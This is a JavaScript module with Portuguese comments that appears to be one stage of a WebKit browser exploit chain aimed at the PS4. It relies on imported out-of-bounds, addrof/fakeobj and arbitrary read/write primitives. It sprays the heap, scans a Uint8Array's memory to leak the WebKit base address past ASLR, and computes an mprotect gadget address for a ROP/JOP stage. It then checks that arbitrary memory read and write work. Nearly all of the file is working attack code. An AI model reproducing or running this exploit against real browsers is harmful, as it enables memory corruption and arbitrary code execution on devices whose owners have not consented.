// js/script3/testArrayBufferVictimCrash.mjs (v120 - R60 Final com Verificação e Robustez Máxima e SCANNER de OFFSET da Structure, C/ TESTE ARB_RW)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
// - AGORA UTILIZA TODAS AS PRIMITIVAS (ADDROF/FAKEOBJ, ARB_READ/ARB_WRITE) DO core_exploit.mjs para maior estabilidade e clareza.
// - **ADICIONADO: Scanner de offsets para a Structure* do JSCell do Uint8Array, para maior adaptabilidade.**
// - **ADICIONADO: Execução inicial de selfTestOOBReadWrite para validar primitivas arb_read/arb_write.**
// - Redução drástica da verbosidade dos logs de debug para facilitar a leitura.
// - Spray volumoso e persistente.
// - Verificação e validação contínuas em cada etapa crítica.
// - Cálculo funcional de endereços de gadgets para ROP/JOP.
// - Teste de resistência ao GC via spray e ciclos.
// - Relatórios de erros mais específicos.
// - Medição de tempo para fases críticas.
// =======================================================================================

import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    clearOOBEnvironment,
    addrof_core,             // Importar addrof_core do core_exploit
    fakeobj_core,            // Importar fakeobj_core do core_exploit
    initCoreAddrofFakeobjPrimitives, // Importar função de inicialização
    arb_read,                // Importar arb_read direto do core_exploit
    arb_write,               // Importar arb_write direto do core_exploit
    selfTestOOBReadWrite     // Importar selfTestOOBReadWrite
} from '../core_exploit.mjs';

import { WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v120_R60_ASLR_LEAK_CLEANER_SCANNER_ARB_TEST"; // Renamed for clarity and scanner

const LOCAL_SHORT_PAUSE = 50;
const LOCAL_MEDIUM_PAUSE = 500;
const LOCAL_LONG_PAUSE = 1000;

let global_spray_objects = []; // Para heap grooming

// Sprays locais usados na Fase 4 (agora declarados no escopo do módulo para limpeza no finally)
let pre_typed_array_spray = [];
let post_typed_array_spray = [];

// Função para escanear offsets potenciais para a Structure*
async function scanForStructurePointerAndLeak(logFn, pauseFn, JSC_OFFSETS_PARAM, typed_array_addr) {
    const FNAME = 'scanForStructurePointerAndLeak';
    logFn(`[SCANNER] Iniciando scanner de offsets para a Structure* do Uint8Array em ${typed_array_addr.toString(true)}...`, "subtest", FNAME);

    const SCAN_RANGE_START = 0x0;
    const SCAN_RANGE_END = 0x100; // Escanear até 256 bytes. Pode ser ajustado.
    const STEP_SIZE = 0x8;       // Ponteiros são geralmente alinhados em 8 bytes (64-bit)

    let scan_results = [];

    const S_INFO_OFFSET_FROM_BASE_ADV = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);

    for (let offset = SCAN_RANGE_START; offset < SCAN_RANGE_END; offset += STEP_SIZE) {
        let current_scan_address = typed_array_addr.add(offset);
        let read_value = null;
        try {
            read_value = await arb_read(current_scan_address, 8); // Ler 8 bytes (um ponteiro)

            // Filtrar valores que parecem ponteiros válidos
            if (isAdvancedInt64Object(read_value) &&
                !read_value.equals(AdvancedInt64.Zero) &&
                !read_value.equals(AdvancedInt64.NaNValue) &&
                read_value.high() !== 0x7ff80000 // Descartar NaN doubles
            ) {
                // Tentativa de ler o ClassInfo* do que parece ser uma Structure*
                const class_info_ptr_candidate_addr = read_value.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET);
                const class_info_ptr_candidate = await arb_read(class_info_ptr_candidate_addr, 8); // Ler o ClassInfo*

                if (isAdvancedInt64Object(class_info_ptr_candidate) &&
                    !class_info_ptr_candidate.equals(AdvancedInt64.Zero) &&
                    !class_info_ptr_candidate.equals(AdvancedInt64.NaNValue) &&
                    class_info_ptr_candidate.high() !== 0x7ff80000
                ) {
                    // Calculo da base WebKit com base no ClassInfo* e offset conhecido de s_info
                    let calculated_webkit_base = class_info_ptr_candidate.sub(S_INFO_OFFSET_FROM_BASE_ADV);

                    // Heurística de ASLR para WebKit base no PS4 (últimos 12 bits devem ser zero ou pequenos)
                    // Ajuste esta heurística se necessário para o seu ambiente.
                    const is_likely_webkit_base = (calculated_webkit_base.low() & 0xFFF) === 0x000;

                    if (is_likely_webkit_base) {
                        logFn(`[SCANNER] CANDIDATO FORTE! Offset: 0x${offset.toString(16).padStart(2, '0')}. Structure*: ${read_value.toString(true)}, ClassInfo*: ${class_info_ptr_candidate.toString(true)}, Base WebKit Calculada: ${calculated_webkit_base.toString(true)}`, "vuln", FNAME);
                        scan_results.push({
                            offset: offset,
                            structure_ptr: read_value,
                            class_info_ptr: class_info_ptr_candidate,
                            webkit_base: calculated_webkit_base
                        });
                        // Não parar aqui, para listar todos os possíveis candidatos dentro do range
                    } else {
                        logFn(`[SCANNER] Candidato (offset 0x${offset.toString(16).padStart(2, '0')}): Structure*: ${read_value.toString(true)}, ClassInfo*: ${class_info_ptr_candidate.toString(true)}, Base WebKit Calculada (IGNORADO - não alinhado): ${calculated_webkit_base.toString(true)}`, "debug", FNAME);
                    }
                } else {
                    logFn(`[SCANNER] Offset: 0x${offset.toString(16).padStart(2, '0')}. Read Structure*: ${read_value.toString(true)}. ClassInfo* inválido lido: ${class_info_ptr_candidate.toString(true)}`, "debug", FNAME);
                }
            } else {
                logFn(`[SCANNER] Offset: 0x${offset.toString(16).padStart(2, '0')}. Valor lido: ${read_value ? read_value.toString(true) : 'N/A'} (Não parece um ponteiro).`, "debug", FNAME);
            }
        } catch (e) {
            logFn(`[SCANNER] Erro ao ler no offset 0x${offset.toString(16).padStart(2, '0')}: ${e.message}`, "error", FNAME);
            // Se um erro grave ocorrer (ex: acesso de memória inválido), o arb_read pode se invalidar.
            // Continuar o loop pode ser arriscado se o ambiente OOB estiver instável.
        }
        await pauseFn(10); // Pequena pausa para evitar sobrecarga
    }

    logFn(`[SCANNER] Varredura de offsets concluída. Total de candidatos promissores: ${scan_results.length}`, "subtest", FNAME);

    if (scan_results.length > 0) {
        return scan_results[0];
    } else {
        logFn(`[SCANNER] Nenhum offset da Structure* que leve a uma base WebKit reconhecível foi encontrado dentro do range ${toHex(SCAN_RANGE_START)}-${toHex(SCAN_RANGE_END)}.`, "error", FNAME);
        return null;
    }
}


// Modified to accept logFn, pauseFn, and JSC_OFFSETS
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - AGORA VIA ArrayBufferView, Primitivas Core) ---`, "test");

    let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
    const startTime = performance.now();

    try {
        logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });

        // --- NOVO PASSO: VALIDAR PRIMITIVAS ARB_READ/ARB_WRITE ---
        logFn("--- FASE 0: Validando primitivas arb_read/arb_write com selfTestOOBReadWrite ---", "subtest");
        const arbTestSuccess = await selfTestOOBReadWrite(logFn);
        if (!arbTestSuccess) {
            const errMsg = "Falha crítica: As primitivas arb_read/arb_write não estão funcionando. Abortando a exploração.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn("Primitivas arb_read/arb_write validadas com sucesso. Prosseguindo com a exploração.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        // --- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---
        logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---", "subtest");
        const sprayStartTime = performance.now();
        const SPRAY_COUNT = 200000;
        logFn(`Iniciando spray de objetos (volume ${SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
        for (let i = 0; i < SPRAY_COUNT; i++) {
            const dataSize = 50 + (i % 20);
            global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
        }
        logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
        logFn("Heap estabilizado inicialmente para reduzir realocações inesperadas pelo GC.", "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // --- FASE 2: Obtendo OOB e Primitivas addrof/fakeobj com validações ---
        logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
        const oobSetupStartTime = performance.now();
        logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
        await triggerOOB_primitive({ force_reinit: true });

        if (!getOOBDataView()) {
            const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn(`Ambiente OOB configurado com DataView: ${getOOBDataView() !== null ? 'Pronto' : 'Falhou'}. Tempo: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // NEW: Initialize core addrof/fakeobj primitives
        initCoreAddrofFakeobjPrimitives();
        logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' (agora no core_exploit.mjs) operacionais e robustas.", "good");


        // --- FASE 3: Primitivas de L/E Autocontidas (via core_exploit.mjs) ---
        logFn("--- FASE 3: Primitivas de Leitura/Escrita Arbitrária fornecidas pelo core_exploit.mjs ---", "subtest");
        logFn(`Primitivas de Leitura/Escrita Arbitrária ('arb_read' e 'arb_write') estão prontas e são acessadas diretamente do core_exploit.mjs.`, "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // --- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional - VIA Uint8Array) ---
        logFn("--- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional - VIA Uint8Array) ---", "subtest");
        const leakPrepStartTime = performance.now();
        let webkit_base_address = null;

        logFn("Iniciando vazamento REAL da base ASLR da WebKit através de Uint8Array (esperado mais estável)...", "info");

        // 1. Criar um Uint8Array como alvo de vazamento para grooming de heap.
        pre_typed_array_spray = [];
        for (let i = 0; i < 200; i++) { pre_typed_array_spray.push(new ArrayBuffer(256 + (i % 128))); }
        const leak_candidate_typed_array = new Uint8Array(0x1000); // 4096 bytes
        post_typed_array_spray = [];
        for (let i = 0; i < 200; i++) { post_typed_array_spray.push(new ArrayBuffer(256 + (i % 128))); }

        logFn(`Objeto Uint8Array criado para vazamento de ClassInfo.`, "debug");
        leak_candidate_typed_array.fill(0xAA);
        logFn(`Uint8Array preenchido com 0xAA.`, "debug");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 2. Obter o endereço de memória do Uint8Array (este é o JSCell do Uint8Array)
        const typed_array_addr = addrof_core(leak_candidate_typed_array); // Usar primitiva addrof_core
        logFn(`[REAL LEAK] Endereço do Uint8Array (JSCell): ${typed_array_addr.toString(true)}`, "leak");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // --- CHAMADA DO SCANNER para encontrar o offset da Structure* ---
        logFn(`[REAL LEAK] Chamando scanner para encontrar o offset da Structure*...`, "info");
        const scan_result = await scanForStructurePointerAndLeak(
            logFn,
            pauseFn,
            JSC_OFFSETS_PARAM,
            typed_array_addr
        );

        let structure_offset_to_use = JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET; // Offset padrão do config.mjs
        let discovered_webkit_base_from_scanner = null;

        if (scan_result && scan_result.webkit_base) {
            logFn(`[REAL LEAK] Scanner encontrou um offset provável para a Structure*: 0x${scan_result.offset.toString(16)}. Usando este offset e a base WebKit descoberta.`, "good");
            structure_offset_to_use = scan_result.offset;
            discovered_webkit_base_from_scanner = scan_result.webkit_base;
        } else {
            logFn(`[REAL LEAK] Scanner não encontrou um offset promissor. Revertendo para o offset padrão 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do config.mjs.`, "warn");
            // Se o scanner falhar, a lógica continuará com o offset padrão e tentará o vazamento como antes.
        }

        // 3. Ler o ponteiro para a Structure* do Uint8Array (JSCell) usando o offset (descoberto ou padrão)
        logFn(`[REAL LEAK] Tentando ler PONTEIRO para a Structure* no offset 0x${structure_offset_to_use.toString(16)} do Uint8Array base (JSCell)...`, "info");

        const structure_pointer_address = typed_array_addr.add(structure_offset_to_use);
        const typed_array_structure_ptr = await arb_read(structure_pointer_address, 8); // Usar arb_read direto
        logFn(`[REAL LEAK] Lido de ${structure_pointer_address.toString(true)}: ${typed_array_structure_ptr.toString(true)}`, "debug");

        if (!isAdvancedInt64Object(typed_array_structure_ptr) || typed_array_structure_ptr.equals(AdvancedInt64.Zero) || typed_array_structure_ptr.equals(AdvancedInt64.NaNValue)) {
            const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da Structure do Uint8Array (offset 0x${structure_offset_to_use.toString(16)}). Endereço inválido: ${typed_array_structure_ptr ? typed_array_structure_ptr.toString(true) : 'N/A'}. Isso pode indicar corrupção ou offset incorreto.`;
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn(`[REAL LEAK] Ponteiro para a Structure* do Uint8Array: ${typed_array_structure_ptr.toString(true)}`, "leak");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 4. Calcular o endereço base do WebKit
        if (discovered_webkit_base_from_scanner) {
            // Se o scanner já encontrou uma base válida, usamos ela diretamente.
            webkit_base_address = discovered_webkit_base_from_scanner;
            logFn(`[REAL LEAK] BASE REAL DA WEBKIT (VALIDADA PELO SCANNER): ${webkit_base_address.toString(true)}`, "leak");
        } else {
            // Se o scanner não encontrou, tentamos calcular com o offset padrão da ClassInfo
            const class_info_ptr = await arb_read(typed_array_structure_ptr.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET), 8); // Usar arb_read direto
            if (!isAdvancedInt64Object(class_info_ptr) || class_info_ptr.equals(AdvancedInt64.Zero) || class_info_ptr.equals(AdvancedInt64.NaNValue)) {
                const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da ClassInfo do Uint8Array's Structure. Endereço inválido: ${class_info_ptr ? class_info_ptr.toString(true) : 'N/A'}. Isso pode indicar corrupção ou offset incorreto.`;
                logFn(errorMsg, "critical");
                throw new Error(errorMsg);
            }
            logFn(`[REAL LEAK] Ponteiro para a ClassInfo (esperado JSC::JSArrayBufferView::s_info): ${class_info_ptr.toString(true)}`, "leak");
            await pauseFn(LOCAL_SHORT_PAUSE);

            const S_INFO_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
            webkit_base_address = class_info_ptr.sub(S_INFO_OFFSET_FROM_BASE);
            logFn(`[REAL LEAK] BASE REAL DA WEBKIT CALCULADA: ${webkit_base_address.toString(true)}`, "leak");
        }


        if (webkit_base_address.equals(AdvancedInt64.Zero)) {
            throw new Error("[REAL LEAK] Endereço base da WebKit calculado resultou em zero. Vazamento pode ter falhado (offset de s_info incorreto?).");
        } else {
            logFn("SUCESSO: Endereço base REAL da WebKit OBTIDO VIA Uint8Array.", "good");
        }
        await pauseFn(LOCAL_MEDIUM_PAUSE);

        // Descoberta de Gadgets (Funcional)
        logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
        const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
        const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);

        logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
        logFn(`PREPARADO: Ferramentas para ROP/JOP (endereços reais) estão prontas. Tempo: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);

        // --- FASE 5: Verificação Funcional de L/E e Teste de Resistência (Pós-Vazamento de ASLR) ---
        logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-Vazamento de ASLR) ---", "subtest");
        const rwTestPostLeakStartTime = performance.now();

        const test_obj_post_leak = global_spray_objects[5001];
        logFn(`Objeto de teste escolhido do spray (índice 5001) para teste pós-vazamento.`, "info");

        // Para ler/escrever propriedades de um objeto JS, ainda precisamos do addrof/fakeobj e offsets do JSCell/Butterfly.
        const test_obj_addr_post_leak = addrof_core(test_obj_post_leak); // Usar addrof_core
        logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");

        const value_to_write_post_leak = new AdvancedInt64(0xDEADC0DE, 0xFEEDBEEF);
        const prop_a_addr_post_leak = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET); // Offset da propriedade "a"

        logFn(`Executando arb_write (Pós-Vazamento): escrevendo ${value_to_write_post_leak.toString(true)} no endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
        await arb_write(prop_a_addr_post_leak, value_to_write_post_leak, 8); // Usar arb_write direto
        logFn(`Escrita do valor de teste (Pós-Vazamento) concluída.`, "info");

        logFn(`Executando arb_read (Pós-Vazamento): lendo do endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
        const value_read_post_leak = await arb_read(prop_a_addr_post_leak, 8); // Usar arb_read direto
        logFn(`>>>>> VALOR LIDO DE VOLTA (Pós-Vazamento): ${value_read_post_leak.toString(true)} <<<<<`, "leak");

        if (!value_read_post_leak.equals(value_to_write_post_leak)) {
            throw new Error(`A verificação de L/E falhou pós-vazamento. Escrito: ${value_to_write_post_leak.toString(true)}, Lido: ${value_read_post_leak.toString(true)}`);
        }
        logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");

        logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária múltiplas vezes...", "info");
        let resistanceSuccessCount_post_leak = 0;
        const numResistanceTests = 5;
        for (let i = 0; i < numResistanceTests; i++) {
            const test_value = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
            try {
                await arb_write(prop_a_addr_post_leak, test_value, 8); // Usar arb_write direto
                const read_back_value = await arb_read(prop_a_addr_post_leak, 8); // Usar arb_read direto

                if (read_back_value.equals(test_value)) {
                    resistanceSuccessCount_post_leak++;
                    logFn(`[Resistência Pós-Vazamento #${i}] SUCESSO: L/E consistente.`, "debug");
                } else {
                    logFn(`[Resistência Pós-Vazamento #${i}] FALHA: L/E inconsistente. Escrito: ${test_value.toString(true)}, Lido: ${read_back_value.toString(true)}`, "error");
                }
            } catch (resErr) {
                logFn(`[Resistência Pós-Vazamento #${i}] ERRO: Exceção durante L/E: ${resErr.message}`, "error");
            }
            await pauseFn(10);
        }
        if (resistanceSuccessCount_post_leak === numResistanceTests) {
            logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
        } else {
            logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
        }
        logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Tempo: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");


        logFn("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++++++++++", "vuln");
        final_result = {
            success: true,
            message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento REAL de Base WebKit e preparação para ACE bem-sucedidos.",
            details: {
                webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
                mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A"
            }
        };

    } catch (e) {
        final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
        final_result.success = false;
        logFn(final_result.message, "critical");
    } finally {
        logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
        // Limpar sprays globais para ajudar o GC
        pre_typed_array_spray = [];
        post_typed_array_spray = [];
        global_spray_objects = []; // Clear main spray

        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logFn(`Limpeza final concluída. Tempo total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
    }

    logFn(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
    logFn(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
    if (final_result.details) {
        logFn(`Detalhes adicionais do teste: ${JSON.stringify(final_result.details)}`, "info");
    }

    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message, details: final_result.details },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified) Enhanced Max Robustness' }
    };
}
